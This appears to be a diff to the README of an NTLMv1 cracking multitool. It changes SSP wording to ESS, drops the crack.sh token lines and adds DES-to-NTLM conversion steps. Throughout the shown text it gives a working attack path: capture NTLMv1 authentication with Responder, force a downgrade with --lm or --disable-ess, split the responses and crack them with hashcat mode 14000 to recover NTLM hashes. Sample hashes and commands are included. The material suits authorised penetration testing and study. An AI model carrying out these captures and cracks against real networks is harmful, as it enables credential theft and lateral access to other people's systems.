@@ -10,7 +10,7 @@ python3 ./ntlmv1.py --ntlm "SERVER1$::MOG:9DE7F41D81C120740000000000000000000000
 ```
 
 # Dec 10, 2019 Updates
-Yes this is supposedly python 3 compatible, I have also merged ntlmv1 and ntlmv1-ssp
+Yes this is supposedly python 3 compatible, I have also merged ntlmv1 and ntlmv1-ess
 
 # ntlmv1-multi
 NTLMv1 Multitool
@@ -23,8 +23,8 @@ It is also based on https://hashcat.net/forum/thread-5912.html and https://www.y
 
 # Usage
 
-## NTLMv1 without SSP
-To capture use responder with the --lm flag, without --lm you will activate ESS/SSP which will take longer to crack, also a new flag is out --disable-ess which will try to disable ESS and force the downgrade. Try --disable-ess first and if that fails please try --lm. If using --disable-ess or --lm ensure your client challenge is 1122334455667788 to use the FPGA, however this may trigger some network IDS/IPS protections if they see that traffic.
+## NTLMv1 without ESS
+To capture use responder with the --lm flag, without --lm you will activate ESS which will take longer to crack, also a new flag is out --disable-ess which will try to disable ESS and force the downgrade. Try --disable-ess first and if that fails please try --lm. If using --disable-ess or --lm ensure your client challenge is 1122334455667788 to use the FPGA, however this may trigger some network IDS/IPS protections if they see that traffic.
 
 The capture will look like this.
 ```
@@ -66,12 +66,9 @@ A52B9CDEDAE86934:1122334455667788
 
 To crack with hashcat:
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
-
-To Crack with crack.sh use the following token
-NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 ```
 
-Now the first and most important thing is the password used in this case is "password" and we can verify the ntlm hash with
+The password used in this case is "password" and we can verify the ntlm hash with
 ```
 echo -n password | iconv -f utf8 -t utf16le | openssl dgst -md4
 (stdin)= 8846f7eaee8fb117ad06bdd830b7586c
@@ -94,6 +91,21 @@ To crack this with hashcat you use
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
 
+An important note is that hashcat will return DES keys and not NTLM keys, you will need to convert to NTLM using `deskey_to_ntlm.pl` from [Hashcat Utils](https://github.com/hashcat/hashcat-utils/releases/), this can be accomplished with
+```
+./deskey_to_ntlm.pl [cracked des key 1]
+./deskey_to_ntlm.pl [cracked des key 2]
+```
+
+you then combine the two ntlm keys with the third part of the password. Calculated by (whatever the tool outputs)
+```
+./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
+```
+
+Add those 3x together and you are good to go
+
+### Testing with the des converter
+
 If you are just testing my code and know the password already you can use the des converter
 ```
 python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
@@ -109,16 +121,17 @@ Basically you do the following
 echo b55d6d04e67926>>des.cand
 echo bcba83e6895b9d>>des.cand
 ```
+
 ```
 ./hashcat -m 14000 -a 0 hashes.txt des.cand
 ```
 
 And you should have some reversed hashes
 
-## NTLMv1 with ESS/SSP
-SSP changes the server challenge, if you see SSP in your responder because you didn't use --lm or the client is set not to give out a LM response then SSP gets engaged. Also --disable-ess will try to force off SSP, however this requires a recent copy (August 2021 or more recent) of impacket and responder.
+## NTLMv1 with ESS
+ESS changes the server challenge, if you see ESS in your responder because you didn't use --lm or the client is set not to give out a LM response then ESS gets engaged. Also --disable-ess will try to force off ESS, however this requires a recent copy (August 2021 or more recent) of impacket and responder.
 
-The SSP output looks like this
+The ESS output looks like this
 ```
 [SMB] NTLMv1-SSP Client   : 184.64.60.62
 [SMB] NTLMv1-SSP Username : DUSTIN-5AA37877\hashcat
@@ -130,9 +143,7 @@ The actual hash looks like this
 hashcat::DUSTIN-5AA37877:85D5BC2CE95161CD00000000000000000000000000000000:892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0:1122334455667788
 ```
 
-The hashcat forums post do not use SSP, so don't try to use the SSP tools on *NON* SSP hashes, you will see a stackload of zero's and thats how you can tell as the LM Response is mangled.
-
-To use the tool run (it is python2 & 3 compatible)
+To use the tool run (it is python3 compatible)
 ```
 python3 ntlmv1.py --ntlmv1 "hashcat::DUSTIN-5AA37877:85D5BC2CE95161CD00000000000000000000000000000000:892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0:1122334455667788"
 ```
@@ -159,8 +170,6 @@ To crack with hashcat create a file with the following contents:
 To crack with hashcat:
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 
-To Crack with crack.sh use the following token
-$NETLM$b36d2b9a8607ea77$892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0
 ```
 
 Now the password we are using in this case is password which has and ntlm hash of ```b4b9b02e6f09a9bd760f388b67351e2b```
@@ -169,12 +178,12 @@ echo -n password | iconv -f utf8 -t utf16le | openssl dgst -md4
 (stdin)= 8846f7eaee8fb117ad06bdd830b7586c
 ```
 
-So to calculate the last 4 characters of the ntlm hash for our NTLMv1-SSP chalenge we use the following command from the tool output to get ```586c```
+So to calculate the last 4 characters of the ntlm hash for our NTLMv1-ESS chalenge we use the following command from the tool output to get ```586c```
 ```
 ./ct3_to_ntlm.bin 2BBD6C9ABCD021D0 1122334455667788 85D5BC2CE95161CD00000000000000000000000000000000
 ```
 
-We must make a hash file with the following content according to the tool which has the modified SRV Challenges to deal with SSP
+We must make a hash file with the following content according to the tool which has the modified SRV Challenges to deal with ESS
 ```
 892F905962F76D32:b36d2b9a8607ea77
 3837F613F88DE27C:b36d2b9a8607ea77
@@ -183,6 +192,13 @@ We must make a hash file with the following content according to the tool which 
 To crack with hashcat we use the following according to the tool
 ```
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
+```
+
+
+An important note is that hashcat will return DES keys and not NTLM keys, you will need to convert to NTLM using `deskey_to_ntlm.pl` from [Hashcat Utils](https://github.com/hashcat/hashcat-utils/releases/), this can be accomplished with
+```
+./deskey_to_ntlm.pl [cracked des key 1]
+./deskey_to_ntlm.pl [cracked des key 2]
 ```
 
 Now assuming we already knew what the ntlm hash was in the case because we made it and want to validate the tooling we use the following
@@ -210,14 +226,6 @@ Now we can crack with hashcat using the following and not waiting 8 days
 ./hashcat -m 14000 -a 0 hashes.txt des.cand
 ```
 
-### crack.sh
-A new update, crack.sh token generation will be appended to all requests
-
-```
-To Crack with crack.sh use the following token
-$NETLM$b36d2b9a8607ea77$892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0
-```
-
 ## NTLM hash to DES Key Converter for data validation testing
 ```
 python ntlm-to-des.py  --ntlm 8846f7eaee8fb117ad06bdd830b7586c
@@ -239,7 +247,6 @@ python3 ntlmv1.py --ntlmv1 "SERVER1$::MOG:7EF3F506F5EA510E0000000000000000000000
 ```
 
 The important fields are:
-* CRACK_SH - this is the field that shows the crack.sh token
 * hash1 - this is the first hash for hashcat mode 14000
 * hash2 - this is the second hash for hashcat mode 14000
 * ct3_crack - this is the command to crack ct3 using hashcat utils
@@ -249,7 +256,7 @@ The important fields are:
 * lmresp - this is the lm response
 * ntresp - this is the nt response
 * challenge - this is the original challenge field
-* srvchallenge - if this is an SSP hash the srv challenge gets populated
+* srvchallenge - if this is an ESS hash the srv challenge gets populated
 
 # Acknowledgement / License
 This repo is based on forum posts by atom the author of hashcat and research by moxie marlinspike. as atoms code is largely MIT licensed this project has also adopted that license to be compatible. This project is not GPL so that any entity can incorporate it into a commercial project without restrictions.
